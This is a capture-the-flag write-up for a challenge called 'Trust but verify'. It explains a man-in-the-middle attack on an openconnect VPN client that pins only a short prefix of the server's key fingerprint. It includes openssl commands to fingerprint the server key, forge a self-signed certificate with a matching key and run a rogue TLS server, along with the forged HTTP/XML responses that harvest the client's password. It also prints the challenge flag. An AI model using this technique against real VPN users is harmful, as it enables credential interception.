# Trust but verify

Author: vcpo

Flag: `EPT{m4st3r_0f_m1tm_r1ght_h3r3}`

## Description

```
We have discovered a compromised machine on our network that is extracting sensitive information in a very creative way. Will you help us find out what information is being extracted?

For your convenience we have attached a setup exactly like the one in production, but it contains mock sensitive data and different certificates. Hopefully this will assist you in production where you will get root access to the gateway server.

The password is 'trust_but_verify', but we recommend changing it to avoid nosy CTF contestants up in your environment.
```

## Provided challenge files

* [challenge.zip](challenge.zip)

## Writeup

Author: 0xLE (Norske Nøkkelstudenter)

We have access to a Kali Linux container that acts as a gateway for the VPN Client container.

![Diagram of the infrastructure](infra.png)

The VPN client has the following script as its entrypoint command:

```shell
#!/bin/sh

ip route delete all
ip route add default via 192.168.2.254
while true
do
    openconnect --servercert sha256:fc21 --authgroup=Route --user=flag --passwd-on-stdin https://192.168.1.2 < /etc/flag.txt
    sleep 10
done
```

The script does the following on a high level:

- Deletes all routes.
- Adds `192.168.2.254` as its default gateway, which is our gateway container.
- Connects to the `openconnect_server` every 10 seconds.

The connection command part is the most interesting one. We have the following observations:

- `--servercert sha256:fc21` [trusts](https://man.archlinux.org/man/openconnect.8.en#servercert=HASH) *all* certificates
  with
  a [public key fingerprint (SHA256) starting with the specified hex](https://github.com/openconnect/openconnect/blob/ca7bc36520e53561eda2c44186dd2a2e20f69d20/library.c#L1199-L1207).
  Do note that `fc21` is only used in the handout, and not in the *production* environment.
- The client connects to the `openconnect_server` container via HTTPS.
- The client pipes the flag to stdin as the password. Which means that the client uses the flag as the password.

This opens up an opportunity to perform a Man-in-the-middle (MITM) attack since the certificate's public key is
*partially* verified, thus making it relatively trivial to create our certificate that passes the check.

First, we need to obtain the certificate's public key being used in *production*. The following commands will retrieve
the TLS certificate used for `192.168.1.2:443` and dump it to `server.pem`. Then, we extract the public key from the
certificate and [digest it](https://www.openssl.org/docs/man1.1.1/man1/dgst.html) using SHA256.

```shell
openssl s_client -showcerts -connect 192.168.1.2:443 </dev/null 2>/dev/null | openssl x509 -outform PEM > server.pem
openssl x509 -in server.pem -pubkey -outform der | openssl rsa -pubin -outform der | openssl dgst -sha256
```

In our *production* environment, the public key's fingerprint started with `37e3`. This value will be used in this
writeup.

The next step is to create an RSA keypair with a public key matching the desired fingerprint. We used
a [simple shell script](brute.sh) to brute force this. This took around 10-20 minutes on my laptop. However, it can be
optimized by running the process in parallel.

After obtaining a keypair with the desired public key fingerprint, we can generate a self-signed certificate with it. It
does not matter what the certificate contains.

```shell
openssl req -x509 -key shitkey.pem -out shitkeycert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

Finally, we can intercept the traffic using the private key and the certificate that we generated.

In our case, we intercepted the traffic designated to `192.168.1.2` to us, the gateway server. This process can be
optimized further by using a tool like [mitmproxy](https://mitmproxy.org/).

When intercepting the traffic manually, we can use OpenSSL to create a server with our private key and certificate.

```shell
openssl s_server -accept 443 -key shitkey.pem -cert shitkeycert.pem -tls1_2
```

Then, we can respond to the requests using the following HTTP responses:

Response to `/`:

```
HTTP/1.1 200 OK
Set-Cookie: webvpncontext=; expires=Thu, 01 Jan 1970 22:00:00 GMT; path=/; Secure
Content-Type: text/xml
Content-Length: 461
X-Transcend-Version: 1

<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="auth-request">
<version who="sg">0.1(1)</version>
<auth id="main">
<message>Please enter your username.</message>
<form method="post" action="/auth">
<input type="text" name="username" label="Username:" />
<select name="group_list" label="Group:">
<option>Route[仅海外代理 Exclude CN]</option>
<option value="All">全局代理 All Proxy</option>
</select>
</form></auth>
</config-auth>
```

Response to the initial `/auth` request:

```
HTTP/1.1 200 OK
Content-Type: text/xml
Content-Length: 193

<?xml version="1.0" encoding="UTF-8"?>
<auth id="passwd">
<message>help</message>
<form method="post" action="/auth">
<input type="password" name="password" label="Password:" />
</form>
</auth>
```

After receiving the final `/auth` request, we can extract the password from the body, which is the flag.
